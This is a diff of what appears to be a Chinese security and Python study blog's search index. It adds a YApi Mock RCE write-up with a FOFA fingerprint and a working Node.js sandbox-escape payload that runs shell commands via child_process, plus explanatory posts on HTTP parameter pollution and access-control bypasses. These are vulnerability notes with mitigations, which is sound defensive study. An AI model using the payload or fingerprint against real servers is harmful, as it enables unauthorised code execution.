@@ -118,6 +118,40 @@
       </tags>
   </entry>
   <entry>
+    <title>Yapi Mock远程代码执行漏洞</title>
+    <url>//46b51a9a8ea4.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
+<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
+<p>注册之后新建项目</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
+<p>添加接口</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
+<p>选择高级mock-脚本-开启脚本</p>
+<p>把以下代码粘贴到脚本中</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
+<p>保存代码并预览</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>Yapi作者已经停止更新，建议禁止用户注册</p>
+<p>升级维护版本（非官方）</p>
+<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>web应用漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>web应用漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python3基础语法</title>
     <url>//08be3fd6d7b6.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -215,6 +249,35 @@
 
 <p>**from…import…**导入模块</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#test1.py</span></span><br><span class="line"><span class="keyword">from</span> a <span class="keyword">import</span> run,data</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">data[<span class="number">0</span>]=<span class="number">5</span> <span class="comment">#类似赋值，b里面的data和a里面的data指向同一个对象，这么做对两者都有影响</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出[5,2,3] </span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br><span class="line"> </span><br><span class="line">data=<span class="number">100</span> <span class="comment">#由于直接改变了data的指向，所以不会影响源模块a</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出100</span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Python3基础知识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3数组</title>
+    <url>//dff4ce1f2267.html</url>
+    <content><![CDATA[<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
+<li>列表(list): 是序列中的可变序列</li>
+<li>元组(tuple): 是序列中的不可变序列</li>
+<li>字典(dict): 新的数据结构，称为映射（mapping）</li>
+<li>集合(set): 是一个无序和无索引的集合。没有重复的成员</li>
+</ul>
+<h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>列表是可变序列</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	列表名字 &#x3D; [a,b,c]</span><br><span class="line">a,b,c是元素，可以是任意的数值类型</span><br></pre></td></tr></table></figure>
+
+<p>通过索引（index）来获取列表里面的元素<br>索引是从0开始的整数，列表第一个位置索引为0，第二个位置索引为1，第三个位置索引为2，以此类推<br>获取多个索引称为切片</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	列表名字[起始索引:结束索引:步长]</span><br><span class="line">步长默认为1，起始位置(包括)和结束位置(不包括)也可省略不写</span><br><span class="line">三者都写成负数，则从列表的后向前取a[-1:-len(a)-1:-1]</span><br></pre></td></tr></table></figure>
+
+<p>可以用切片修改列表<br>对象名[起始索引:结束索引:步长] = [元素1,元素2……]<br>a[len(a):]=[11]    结尾增加<br>a[0:0]=[1,2,3] 固定位置或者开头增加<br>a[0:3] = [1,2,3] 修改前三个</p>
+<p>通过for循环遍历列表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">for 变量 in 序列 :</span><br><span class="line">	代码块</span><br></pre></td></tr></table></figure>
+
+
 
 ]]></content>
       <categories>
@@ -473,35 +536,6 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x.方法名(条件))</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">capitalize()	把首字符转换为大写。</span><br><span class="line">casefold()		把字符串转换为小写。</span><br><span class="line">center()		返回居中的字符串。</span><br><span class="line">count()			返回指定值在字符串中出现的次数。</span><br><span class="line">encode()		返回字符串的编码版本。</span><br><span class="line">endswith()		如果字符串以指定值结尾，则返回 true。</span><br><span class="line">expandtabs()	设置字符串的 tab 尺寸。</span><br><span class="line">find()			在字符串中搜索指定的值并返回它被找到的位置。</span><br><span class="line"><span class="built_in">format</span>()		格式化字符串中的指定值。</span><br><span class="line">format_map()	格式化字符串中的指定值。</span><br><span class="line">index()			在字符串中搜索指定的值并返回它被找到的位置。</span><br><span class="line">isalnum()		如果字符串中的所有字符都是字母数字，则返回 <span class="literal">True</span>。</span><br><span class="line">isalpha()		如果字符串中的所有字符都在字母表中，则返回 <span class="literal">True</span>。</span><br><span class="line">isdecimal()		如果字符串中的所有字符都是小数，则返回 <span class="literal">True</span>。</span><br><span class="line">isdigit()		如果字符串中的所有字符都是数字，则返回 <span class="literal">True</span>。</span><br><span class="line">isidentifier()	如果字符串是标识符，则返回 <span class="literal">True</span>。</span><br><span class="line">islower()		如果字符串中的所有字符都是小写，则返回 <span class="literal">True</span>。</span><br><span class="line">isnumeric()		如果字符串中的所有字符都是数，则返回 <span class="literal">True</span>。</span><br><span class="line">isprintable()	如果字符串中的所有字符都是可打印的，则返回 <span class="literal">True</span>。</span><br><span class="line">isspace()		如果字符串中的所有字符都是空白字符，则返回 <span class="literal">True</span>。</span><br><span class="line">istitle()		如果字符串遵循标题规则，则返回 <span class="literal">True</span>。</span><br><span class="line">isupper()		如果字符串中的所有字符都是大写，则返回 <span class="literal">True</span>。</span><br><span class="line">join()			把可迭代对象的元素连接到字符串的末尾。</span><br><span class="line">ljust()			返回字符串的左对齐版本。</span><br><span class="line">lower()			把字符串转换为小写。</span><br><span class="line">lstrip()		返回字符串的左修剪版本。</span><br><span class="line">maketrans()		返回在转换中使用的转换表。</span><br><span class="line">partition()		返回元组，其中的字符串被分为三部分。</span><br><span class="line">replace()		返回字符串，其中指定的值被替换为指定的值。</span><br><span class="line">rfind()			在字符串中搜索指定的值，并返回它被找到的最后位置。</span><br><span class="line">rindex()		在字符串中搜索指定的值，并返回它被找到的最后位置。</span><br><span class="line">rjust()			返回字符串的右对齐版本。</span><br><span class="line">rpartition()	返回元组，其中字符串分为三部分。</span><br><span class="line">rsplit()		在指定的分隔符处拆分字符串，并返回列表。</span><br><span class="line">rstrip()		返回字符串的右边修剪版本。</span><br><span class="line">split()			在指定的分隔符处拆分字符串，并返回列表。</span><br><span class="line">splitlines()	在换行符处拆分字符串并返回列表。</span><br><span class="line">startswith()	如果以指定值开头的字符串，则返回 true。</span><br><span class="line">strip()			返回字符串的剪裁版本。</span><br><span class="line">swapcase()		切换大小写，小写成为大写，反之亦然。</span><br><span class="line">title()			把每个单词的首字符转换为大写。</span><br><span class="line">translate()		返回被转换的字符串。</span><br><span class="line">upper()			把字符串转换为大写。</span><br><span class="line">zfill()			在字符串的开头填充指定数量的 <span class="number">0</span> 值。</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python3基础知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3数组</title>
-    <url>//dff4ce1f2267.html</url>
-    <content><![CDATA[<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
-<li>列表(list): 是序列中的可变序列</li>
-<li>元组(tuple): 是序列中的不可变序列</li>
-<li>字典(dict): 新的数据结构，称为映射（mapping）</li>
-<li>集合(set): 是一个无序和无索引的集合。没有重复的成员</li>
-</ul>
-<h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>列表是可变序列</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">	列表名字 &#x3D; [a,b,c]</span><br><span class="line">a,b,c是元素，可以是任意的数值类型</span><br></pre></td></tr></table></figure>
-
-<p>通过索引（index）来获取列表里面的元素<br>索引是从0开始的整数，列表第一个位置索引为0，第二个位置索引为1，第三个位置索引为2，以此类推<br>获取多个索引称为切片</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	列表名字[起始索引:结束索引:步长]</span><br><span class="line">步长默认为1，起始位置(包括)和结束位置(不包括)也可省略不写</span><br><span class="line">三者都写成负数，则从列表的后向前取a[-1:-len(a)-1:-1]</span><br></pre></td></tr></table></figure>
-
-<p>可以用切片修改列表<br>对象名[起始索引:结束索引:步长] = [元素1,元素2……]<br>a[len(a):]=[11]    结尾增加<br>a[0:0]=[1,2,3] 固定位置或者开头增加<br>a[0:3] = [1,2,3] 修改前三个</p>
-<p>通过for循环遍历列表</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">for 变量 in 序列 :</span><br><span class="line">	代码块</span><br></pre></td></tr></table></figure>
-
-
 
 ]]></content>
       <categories>
@@ -1027,6 +1061,61 @@
       </tags>
   </entry>
   <entry>
+    <title>HPP参数污染漏洞</title>
+    <url>//4189faf9a367.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com/?name=aa&amp;name=bb">http://www.baidu.com?name=aa&amp;name=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是name=aa。有的服务器是取第二个参数，也就是name=bb。有的服务器两个参数都取，也就是name=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
+<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
+<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
+<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
+<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
+<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">web服务器</th>
+<th align="center">获取参数函数</th>
+<th align="center">获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP/Apache</td>
+<td align="center">$_GET(“test”)</td>
+<td align="center">last</td>
+</tr>
+<tr>
+<td align="center">JSP/Tomcat</td>
+<td align="center">Request.getParameter(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Perl(CGI)/Apache</td>
+<td align="center">Param(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Python/Apache</td>
+<td align="center">getvalue(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+<tr>
+<td align="center">ASP/IIS</td>
+<td align="center">Request.QueryString(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+</tbody></table>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
+<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>低危漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>jQuery库版本过低</title>
     <url>//c7d50197fdce.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -1146,6 +1235,77 @@
       <tags>
         <tag>高危漏洞</tag>
         <tag>代码执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>越权漏洞</title>
+    <url>//7e65569ca276.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>越权访问（Broken Access Control，简称BAC）是未必应用程序中一种常见的漏洞，范围广，危害大。</p>
+<p>该漏洞是指应用在检查授权时存在纰漏，使得攻击者在活动地权限账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增，删，改，查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就容易导致越权漏洞</p>
+<p>靶场：<a href="http://www.wbug.org:9003/">http://www.wbug.org:9003/</a></p>
+<h3 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h3><p>越权访问漏洞主要分为水平越权，垂直越权</p>
+<p><strong>水平越权</strong>：指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问。</p>
+<p><strong>垂直越权</strong>：由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。比如用户A与用户B是处于两个不等的等级，低等级用户获取到了高等级用户权限，这种称之为垂直越权漏洞</p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
+<li>越权访问漏洞最基础的是ID</li>
+<li>发生越权访问的前提是两个用户处于同一张数据表内</li>
+</ul>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h3><p>通常情况下，一个web程序的功能流程是登录-提交请求-验证权限-数据库查询-返回结果。</p>
+<p>如果权限验证不足，就会导致越权。常见的程序通常会认为通过登录之后即可验证用户的身份，从而不会去做下一步的验证，最后导致越权。</p>
+<h3 id="越权行为"><a href="#越权行为" class="headerlink" title="越权行为"></a>越权行为</h3><h4 id="通过隐藏URL"><a href="#通过隐藏URL" class="headerlink" title="通过隐藏URL"></a>通过隐藏URL</h4><p>实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。</p>
+<h4 id="直接对象引用"><a href="#直接对象引用" class="headerlink" title="直接对象引用"></a>直接对象引用</h4><p>这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。</p>
+<h4 id="多阶段功能"><a href="#多阶段功能" class="headerlink" title="多阶段功能"></a>多阶段功能</h4><p>多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p>
+<h4 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h4><p>很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。</p>
+<h4 id="平台配置错误"><a href="#平台配置错误" class="headerlink" title="平台配置错误"></a>平台配置错误</h4><p>一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。</p>
+<h3 id="cookie越权"><a href="#cookie越权" class="headerlink" title="cookie越权"></a>cookie越权</h3><ul>
+<li>平行越权<ul>
+<li>userid<ul>
+<li>1</li>
+<li>2</li>
+</ul>
+</li>
+<li>username<ul>
+<li>zhangsan</li>
+<li>wangwu</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>垂直越权<ul>
+<li>nember_type<ul>
+<li>user</li>
+<li>admin</li>
+<li>manager</li>
+<li>system</li>
+</ul>
+</li>
+<li>user_type<ul>
+<li>0</li>
+<li>1</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>当我们找到一些关键参数，如id,user_id,pid等，关注每一个可能决定用户权限的参数值，通过加减1提交整数值，查看是否显示超出权限的数据，如参数不是数字，则查找相关权限词组，比如把user改成admin，查看是否显示超出权限的数据。</p>
+<h3 id="ID类型"><a href="#ID类型" class="headerlink" title="ID类型"></a>ID类型</h3><p>常规类型：1，2，3，4，5…..</p>
+<p>加密类型：如MD5加密</p>
+<p>加码类型：如base64</p>
+<p>随机类型：字母+数字</p>
+<p>可推理类型：如日期+序号</p>
+<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>1、前后端同时对用户输入信息进行校验，双重验证机制</p>
+<p>2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p>
+<p>3、特别敏感操作可以让用户再次输入密码或其他的验证信息。</p>
+<p>4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。</p>
+<p>5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p>
+<p>6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>逻辑漏洞</tag>
       </tags>
   </entry>
 </search>
